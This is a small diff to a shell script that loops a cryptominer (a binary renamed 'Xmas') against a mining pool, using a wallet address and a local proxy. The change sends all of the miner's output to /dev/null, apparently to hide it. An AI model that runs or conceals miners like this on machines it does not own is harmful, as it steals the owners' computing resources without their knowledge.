@@ -125,6 +125,6 @@ sleep 2
 
 while true
 do
-./Xmas --donate-level 1 -a ghostrider --url na.mecrypto.club:7171 --user Jgbyn6TJtRcw6UUsaPHufoVPLDnNK6T2dQ.$currentdate --pass c=JGC,m=solo -k -t $used_num_of_cores -x 127.0.0.1:1081 --verbose --randomx-1gb-pages
+./Xmas --donate-level 1 -a ghostrider --url na.mecrypto.club:7171 --user Jgbyn6TJtRcw6UUsaPHufoVPLDnNK6T2dQ.$currentdate --pass c=JGC,m=solo -k -t $used_num_of_cores -x 127.0.0.1:1081 --verbose --randomx-1gb-pages 1>/dev/null 2>&1
 sleep 10
 done
